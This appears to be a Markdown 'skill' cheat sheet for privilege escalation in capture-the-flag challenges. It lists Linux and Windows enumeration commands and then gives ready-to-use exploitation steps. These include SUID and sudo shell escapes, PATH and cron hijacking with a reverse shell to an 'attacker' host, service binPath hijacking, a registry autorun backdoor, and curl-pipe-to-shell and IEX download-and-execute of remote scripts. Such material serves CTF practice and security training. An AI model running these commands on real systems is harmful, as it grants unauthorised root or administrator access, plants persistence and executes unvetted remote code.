# CTF Skill: Privilege Escalation

## Purpose
Techniques for escalating privileges in CTF challenges.

## Linux Enumeration

### System Information
```bash
# OS version
cat /etc/issue
cat /etc/*release
uname -a
hostname

# Kernel version
cat /proc/version
dmesg | grep -i linux

# Architecture
dpkg --print-architecture
lscpu | grep Architecture
```

### User Context
```bash
# Current user
id
whoami
groups

# All users
cat /etc/passwd
cat /etc/shadow  # If readable
sudo -l

# Sudo permissions
sudo -l -l
```

### Running Processes
```bash
ps aux
ps aux | grep root
ps -ef

# Processes running as root
ps aux | grep '^root'
```

### Network Information
```bash
netstat -tulpn
ss -tulpn
ifconfig
ip addr
route
arp -a
```

### Cron Jobs
```bash
# System crontabs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /var/spool/cron/

# User crontabs
crontab -l
```

### SUID/SGID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
find / -perm -6000 -type f 2>/dev/null

# Known dangerous binaries
# nmap, vim, less, more, nano, awk, python, perl, ruby, etc.
```

### Writable Files
```bash
# Writable files owned by root
find / -user root -perm -002 -type f 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null

# World-writable files
find / -perm -0002 -type f 2>/dev/null
```

### Service Analysis
```bash
# Running services
systemctl list-units --type=service --state=running
service --status-all

# Service configurations
ls -la /etc/init.d/
cat /etc/init.d/*
```

## Linux Exploitation

### SUID Exploitation
```bash
# GTFOBins
# https://gtfobins.github.io/

# Python SUID
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Nmap interactive
/usr/bin/nmap --interactive
!sh

# Vim
/usr/bin/vim -c ':!/bin/sh'

# Less/More
!/bin/sh

# nano with sudo
sudo nano /etc/passwd
```

### Sudo Exploitation
```bash
# Known exploits
sudo -l

# www-data can run python
sudo python -c 'import os; os.system("/bin/bash")'

# vim/nano/less
sudo vim
sudo less /etc/passwd

# find
sudo find . -exec /bin/sh -p \; -quit
```

### Kernel Exploits
```bash
# Identify kernel
uname -r
cat /proc/version

# Search for exploits
searchsploit kernel 3.13
searchsploit "Ubuntu 14.04"

# Common exploits
# dirtycow (CVE-2016-5195)
# overlayfs (CVE-2015-1328)
# stack Clash (CVE-2017-1000364)
```

### Path Hijacking
```bash
# If script uses relative path
# e.g., ./service instead of /usr/bin/service

# Create malicious binary
echo '#!/bin/bash' > /tmp/service
echo '/bin/bash -p' >> /tmp/service
chmod +x /tmp/service

# Modify PATH
export PATH=/tmp:$PATH
# Trigger vulnerable script
```

### Cron Hijacking
```bash
# If cron runs script we can modify
cat /etc/crontab
ls -la /path/to/script

# Overwrite with reverse shell
echo '#!/bin/bash' > /path/to/script
echo '/bin/bash -i >& /dev/tcp/attacker/port 0>&1' >> /path/to/script
```

## Windows Enumeration

### System Info
```powershell
# Basic info
systeminfo
hostname
whoami
whoami /priv

# User info
net user
net user administrator
net localgroup administrators

# OS version
[System.Environment]::OSVersion.Version
wmic os get caption,version
```

### Service Analysis
```powershell
# List services
sc query
sc query state=all

# Service configuration
sc qc service_name

# Find writable services
accesschk.exe -uwcqv "Authenticated Users" *

# Modify service
sc config ServiceName binPath= "cmd /c ..."
```

### Registry
```powershell
# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

# Autorun locations
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

### Scheduled Tasks
```powershell
schtasks /query /fo LIST /v
Get-ScheduledTask | Select-Object TaskName, State
```

### Writable Files
```powershell
# Find writable executables
accesschk.exe -wus "Users" *
Get-ChildItem "C:\Program Files" -Recurse -File | % { $_.FullName }

# DLL Hijacking
# Check PATH for writable directories
echo %PATH%
```

## Windows Exploitation

### Service Exploits
```powershell
# Service path hijacking
sc qc vulnerable_service
# Check BINARY_PATH_NAME for writable dir

# Modify and restart
sc config ServiceName binPath= "C:\path\to\malicious.exe"
net stop ServiceName
net start ServiceName
```

### Registry Exploits
```powershell
# Autorun registry
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\path\to\backdoor.exe"

# AlwaysInstallElevated
msiexec /quiet /qn /i malicious.msi
```

### Named Pipe Exploits
```powershell
# Impersonation via named pipe
# Use SeImpersonatePrivilege
# potato家族: RottenPotato, JuicyPotato, SweetPotato
```

### Kernel Exploits
```powershell
# Identify patches
systeminfo
wmic qfe list

# Search exploits
# windows-exploit-suggester
# Sherlock.ps1
# Watson
```

## Tools

### Linux
```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | sh

# linux-exploit-suggester
curl -L https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | sh
```

### Windows
```powershell
# WinPEAS
# Download and execute
IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')

# PowerUp
IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1')

# PrivescScanner
```

## Checklist
```
[ ] System info (OS, kernel, version)
[ ] Current user and privileges
[ ] SUID/SGID binaries
[ ] Sudo permissions
[ ] Running services
[ ] Cron jobs
[ ] Network connections
[ ] Writable files/directories
[ ] Kernel exploits
[ ] Application vulnerabilities
```
